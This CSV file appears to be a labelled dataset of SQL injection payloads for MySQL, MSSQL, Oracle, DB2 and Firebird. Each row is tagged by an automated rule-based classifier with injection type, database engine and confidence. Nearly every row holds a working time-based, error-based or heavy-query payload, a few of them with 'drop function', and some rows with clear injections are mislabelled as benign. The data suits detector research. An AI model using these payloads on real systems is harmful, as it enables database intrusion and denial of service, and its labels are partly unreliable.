id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
18236,"1%' ) ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( ( '%' = '",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via extractvalue/updatexml. Payload contains: ""1%' ) ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393""",2
18237,"1', ( select ( case when ( 2106 = 2106 ) then ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) else 2106* ( select 2106 from master..sysdatabases ) end ) )",heavy_query,mssql,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=mssql via waitfor/xp_/sysobjects. Payload contains: ""1', ( select ( case when ( 2106 = 2106 ) then ( select count ( * ) from sysusers""",1
18238,"1 where 7051 = 7051 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,generic,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=generic. Payload contains: '1 where 7051 = 7051 or 4411 = ( select count ( * ) from sysusers as sys1,sysuser'",1
18239,"1"" ) ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via sleep(). Payload contains: '1"" ) ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #'",2
18240,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ""%"" = """,benign,generic,0.5,"UNCERTAIN: no recognized injection signals in payload snippet: 'call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ""%"" = ""'",1
18241,"1"" or elt ( 6272 = 6272,sleep ( 5 ) )",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via sleep(). Payload contains: '1"" or elt ( 6272 = 6272,sleep ( 5 ) )'",2
18242,"1%' ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via sleep(). Payload contains: ""1%' ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #""",2
18243,"1' where 5702 = 5702 and elt ( 3114 = 3114,sleep ( 5 ) ) #",boolean_blind,mysql,0.95,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via sleep(). Payload contains: ""1' where 5702 = 5702 and elt ( 3114 = 3114,sleep ( 5 ) ) #""",3
18244,"1"" ) ) as osuh where 8809 = 8809",benign,generic,0.5,"UNCERTAIN: no recognized injection signals in payload snippet: '1"" ) ) as osuh where 8809 = 8809'",2
18245,1%' order by 1#,benign,generic,0.6,"UNCERTAIN: no strong rule match. Sources A=benign, C=benign agree. Payload snippet: ""1%' order by 1#""",3
18246,"1"" ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ""nwzu"" like ""nwzu",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via elt/rlike. Payload contains: '1"" ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt'",2
18247,"1"" ) ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( ""hkjm"" like ""hkjm",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via elt/rlike. Payload contains: '1"" ) ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( se'",2
18248,"1' ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( 'mwyu' = 'mwyu",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via extractvalue/updatexml. Payload contains: ""1' ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982""",2
18249,"1 ) ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,0.9,"Token 'extractvalue()' → error_based (priority 4); DB=mysql via extractvalue/updatexml. Payload contains: '1 ) ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 50000'",2
18250,"1 where 3902 = 3902 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,generic,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=generic. Payload contains: '1 where 3902 = 3902 or 9643 = ( select count ( * ) from domain.domains as t1,dom'",1
18251,"1'|| ( select 'oyyu' where 6765 = 6765 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) ) ||'",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via extractvalue/updatexml. Payload contains: ""1'|| ( select 'oyyu' where 6765 = 6765 or updatexml ( 1808,concat ( 0x2e,0x71717""",2
18252,"1"" ) ) as rcse where 4559 = 4559 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via extractvalue/updatexml. Payload contains: '1"" ) ) as rcse where 4559 = 4559 and extractvalue ( 7982,concat ( 0x5c,0x7171706'",2
18253,"1"" ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ""oxvw"" = ""oxvw",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via elt/rlike. Payload contains: '1"" ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt'",2
18254,-9840' ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'dzlp' = 'dzlp,boolean_blind,oracle,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: ""-9840' ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 )""",3
18255,"1'|| ( select 'svbf' where 7017 = 7017 or elt ( 6272 = 6272,sleep ( 5 ) ) ) ||'",boolean_blind,mysql,0.95,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via sleep(). Payload contains: ""1'|| ( select 'svbf' where 7017 = 7017 or elt ( 6272 = 6272,sleep ( 5 ) ) ) ||'""",3
18256,"1"" ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ""pfea"" = ""pfea",heavy_query,db2,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=db2 via sysibm. Payload contains: '1"" ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systable'",1
18257,"-8209 ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",benign,generic,0.5,"UNCERTAIN: no recognized injection signals in payload snippet: '-8209 ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end '",1
18258,-9826 where 4103 = 4103 order by 1#,benign,generic,0.5,UNCERTAIN: no recognized injection signals in payload snippet: '-9826 where 4103 = 4103 order by 1#',2
18259,1%' and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and '%' = ',boolean_blind,oracle,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: ""1%' and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr""",3
18260,"1%' or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and '%' = '",heavy_query,firebird,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=firebird via rdb$/gen_id. Payload contains: ""1%' or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$col""",1
18261,"1"" where 6800 = 6800 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,0.9,"Token 'extractvalue()' → error_based (priority 4); DB=mysql via extractvalue/updatexml. Payload contains: '1"" where 6800 = 6800 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( be'",2
18262,"1"" and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ""egzm"" = ""egzm",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via extractvalue/updatexml. Payload contains: '1"" and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393'",2
18263,"end and ( ( ""%"" = """,benign,generic,0.5,"UNCERTAIN: no recognized injection signals in payload snippet: 'end and ( ( ""%"" = ""'",2
18264,"1"" ) ) as bbkl where 5686 = 5686",benign,generic,0.5,"UNCERTAIN: no recognized injection signals in payload snippet: '1"" ) ) as bbkl where 5686 = 5686'",2
18265,1'+ ( select 'cwta' where 6091 = 6091,boolean_blind,generic,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: ""1'+ ( select 'cwta' where 6091 = 6091""",3
18266,"1"" ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( ""xccy"" = ""xccy",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via extractvalue/updatexml. Payload contains: '1"" ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982'",2
18267,"1"" ) as xioc where 7260 = 7260 or elt ( 5873 = 5873,sleep ( 5 ) ) #",boolean_blind,mysql,0.95,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via sleep(). Payload contains: '1"" ) as xioc where 7260 = 7260 or elt ( 5873 = 5873,sleep ( 5 ) ) #'",3
18268,"-2298%' or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",benign,generic,0.5,"UNCERTAIN: no recognized injection signals in payload snippet: ""-2298%' or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end """,1
18269,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4",boolean_blind,firebird,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: 'select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rd'",3
18270,"1"" ) ) as mvxa where 3024 = 3024",benign,generic,0.5,"UNCERTAIN: no recognized injection signals in payload snippet: '1"" ) ) as mvxa where 3024 = 3024'",2
18271,"1"" ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ""cneo"" like ""cneo",boolean_blind,mysql,0.95,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via sleep(). Payload contains: '1"" ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ""cneo"" like ""'",3
18272,"1%"" or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ""%"" = """,heavy_query,generic,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=generic. Payload contains: '1%"" or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t'",1
18273,"1' ) ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=db2 via sysibm. Payload contains: ""1' ) ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systab""",1
18274,"end and ( ""xksk"" = ""xksk",benign,generic,0.5,"UNCERTAIN: no recognized injection signals in payload snippet: 'end and ( ""xksk"" = ""xksk'",2
18275,1' ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 'lnte' = 'lnte,boolean_blind,oracle,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: ""1' ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||ch""",3
18276,"1"" ) as rnte where 6517 = 6517 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=firebird via rdb$/gen_id. Payload contains: '1"" ) as rnte where 6517 = 6517 and 9254 = ( select count ( * ) from rdb$fields a'",1
18277,1' order by 1#,benign,generic,0.6,"UNCERTAIN: no strong rule match. Sources A=benign, C=benign agree. Payload snippet: ""1' order by 1#""",3
18278,"1"" ) ) as qvyu where 5962 = 5962 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via extractvalue/updatexml. Payload contains: '1"" ) ) as qvyu where 5962 = 5962 or updatexml ( 1808,concat ( 0x2e,0x7171706a71,'",2
18279,"1%' or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,generic,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=generic. Payload contains: ""1%' or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t""",1
18280,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ( 5432 = 5432",boolean_blind,generic,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: 'select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_'",3
18281,"1'+ ( select 'iyvn' where 9358 = 9358 or elt ( 6272 = 6272,sleep ( 5 ) ) ) +'",boolean_blind,mysql,0.95,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via sleep(). Payload contains: ""1'+ ( select 'iyvn' where 9358 = 9358 or elt ( 6272 = 6272,sleep ( 5 ) ) ) +'""",3
18282,"1,exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 7759 = 7759,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) )",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via elt/rlike. Payload contains: '1,exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 7759 '",2
18283,"1' ) ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( 'dhqz' = 'dhqz",heavy_query,generic,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=generic. Payload contains: ""1' ) ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_user""",1
18284,"1' ) as ywtu where 3009 = 3009 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,generic,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=generic. Payload contains: ""1' ) as ywtu where 3009 = 3009 or 4915 = ( select count ( * ) from domain.domain""",1
18285,1'|| ( select 'jmao' where 3009 = 3009,boolean_blind,generic,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: ""1'|| ( select 'jmao' where 3009 = 3009""",3
18286,"1 ) where 4698 = 4698 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,generic,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=generic. Payload contains: '1 ) where 4698 = 4698 and 3580 = ( select count ( * ) from domain.domains as t1,'",1
18287,"1'|| ( select 'rfjl' where 2476 = 2476 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) ) ||'",heavy_query,firebird,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=firebird via rdb$/gen_id. Payload contains: ""1'|| ( select 'rfjl' where 2476 = 2476 or 7552 = ( select count ( * ) from rdb$f""",1
18288,"1 ) ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,generic,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=generic. Payload contains: '1 ) ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns'",1
18289,1'+ ( select wgmn where 4368 = 4368 and 7859 = 6151 ) +',boolean_blind,generic,0.95,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=generic. Payload contains: ""1'+ ( select wgmn where 4368 = 4368 and 7859 = 6151 ) +'""",3
18290,"1' ) as mvai where 5856 = 5856 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via elt/rlike. Payload contains: ""1' ) as mvai where 5856 = 5856 and exp ( ~ ( select * from ( select concat ( 0x7""",2
18291,"1%"" ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via sleep(). Payload contains: '1%"" ) and elt ( 3114 = 3114,sleep ( 5 ) ) #'",2
18292,"1"" ) ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( ""xnsj"" like ""xnsj",heavy_query,generic,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=generic. Payload contains: '1"" ) ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.column'",1
18293,"1"" ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( ""ozvp"" = ""ozvp",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via extractvalue/updatexml. Payload contains: '1"" ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 '",2
18294,-7199'|| ( select 'ssty' where 5406 = 5406 order by 1#,boolean_blind,generic,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: ""-7199'|| ( select 'ssty' where 5406 = 5406 order by 1#""",3
18295,"1"" ) ) as rpxd where 4929 = 4929",benign,generic,0.5,"UNCERTAIN: no recognized injection signals in payload snippet: '1"" ) ) as rpxd where 4929 = 4929'",2
18296,1'|| ( select 'noik' from dual where 9851 = 9851,boolean_blind,oracle,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: ""1'|| ( select 'noik' from dual where 9851 = 9851""",3
18297,"1%' ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( '%' = '",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via elt/rlike. Payload contains: ""1%' ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( el""",2
18298,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and '%' = '",benign,generic,0.5,"UNCERTAIN: no recognized injection signals in payload snippet: ""call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and '%' = '""",1
18299,"1 ) as wust where 3884 = 3884 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.75,Token 'nested cross-join count' → heavy_query (priority 4); DB=db2 via sysibm. Payload contains: '1 ) as wust where 3884 = 3884 and 8189 = ( select count ( * ) from sysibm.systab',1
18300,"1"" ) ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( ""gimc"" like ""gimc",heavy_query,db2,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=db2 via sysibm. Payload contains: '1"" ) ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systa'",1
18301,"1' or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,generic,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=generic. Payload contains: ""1' or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2""",1
18302,"1"" ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( ""kcxw"" = ""kcxw",boolean_blind,oracle,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: '1"" ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) '",3
18303,if ( 3831 = 9321 ) select 3831 else drop function ybru--,boolean_blind,generic,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: 'if ( 3831 = 9321 ) select 3831 else drop function ybru--'",3
18304,if ( 3490 = 4920 ) select 3490 else drop function hlzt--,boolean_blind,generic,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: 'if ( 3490 = 4920 ) select 3490 else drop function hlzt--'",3
18305,"1 ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",heavy_query,generic,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=generic. Payload contains: '1 ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,a'",1
18306,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- uugg",boolean_blind,db2,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: 'select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.sys'",3
18307,-2573 ) ) order by 1#,benign,generic,0.6,"UNCERTAIN: no strong rule match. Sources A=benign, C=benign agree. Payload snippet: '-2573 ) ) order by 1#'",3
18308,"1"" ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ""dtfg"" = ""dtfg",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via elt/rlike. Payload contains: '1"" ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( sel'",2
18309,"1' and elt ( 1210 = 1210,sleep ( 5 ) ) and 'ioar' = 'ioar",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via sleep(). Payload contains: ""1' and elt ( 1210 = 1210,sleep ( 5 ) ) and 'ioar' = 'ioar""",2
18310,"1 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) # msrb",heavy_query,generic,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=generic. Payload contains: '1 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all'",1
18311,"1' and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and 'ulep' = 'ulep",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via elt/rlike. Payload contains: ""1' and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( """,2
18312,"1"" ) as buky where 7898 = 7898 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,generic,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=generic. Payload contains: '1"" ) as buky where 7898 = 7898 or 1022 = ( select count ( * ) from all_users t1,'",1
